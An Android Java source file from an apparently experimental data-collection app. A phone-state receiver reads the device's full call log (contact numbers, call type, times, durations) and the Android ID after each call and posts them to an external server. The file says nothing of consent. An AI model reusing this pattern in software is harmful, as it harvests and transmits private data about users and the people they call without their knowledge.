package com.federation.funf_test.CallActivity;

import android.app.IntentService;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.federation.funf_test.JSONParser;

import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;

public class CallIntentService extends BroadcastReceiver {

    ArrayList params = new ArrayList();
    ArrayList<JSONObject> callLogArrayList= new ArrayList<>();
    JSONParser jsonParser = new JSONParser();
    String androidId;

    private static String url_create = "https://pos.pentacle.tech/api/call/create";
    private static final String TAG_SUCCESS = "success";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

            try {
                Toast.makeText(context,"Call Receiver start ",Toast.LENGTH_SHORT).show();

                if ((state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))){
                    Toast.makeText(context,"Received State",Toast.LENGTH_SHORT).show();
                }
                if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)){
                    Toast.makeText(context,"Idle State",Toast.LENGTH_SHORT).show();

                    getCallDetails(context);

                    params.add(new BasicNameValuePair("device_id", androidId));
                    params.add(new BasicNameValuePair("call_list", callLogArrayList.toString()));
                    new CreateNewResult().execute();
                }
            }
            catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    private void getCallDetails(Context context) {
        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            JSONObject newCall = new JSONObject();

            androidId = Settings.Secure.getString(context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);

            try {
                newCall.put("device_id", androidId);
                newCall.put("phone_number", phNumber);
                newCall.put("type", dir);
                newCall.put("called_at", callDate);
                newCall.put("duration", callDuration);

                callLogArrayList.add(newCall);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        managedCursor.close();
    }

    class CreateNewResult extends AsyncTask<String, String, JSONObject> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        protected JSONObject doInBackground(String... args) {
            // getting JSON Object
            // Note that create product url accepts POST methodN
            JSONObject json = jsonParser.makeHttpRequest(url_create,
                    "POST", params);
            // check log cat fro response
            //Log.d("Debug", json.toString());

            return json;
        }

        protected void onPostExecute(JSONObject file_url) {
            // dismiss the dialog once done
        }
    }
}
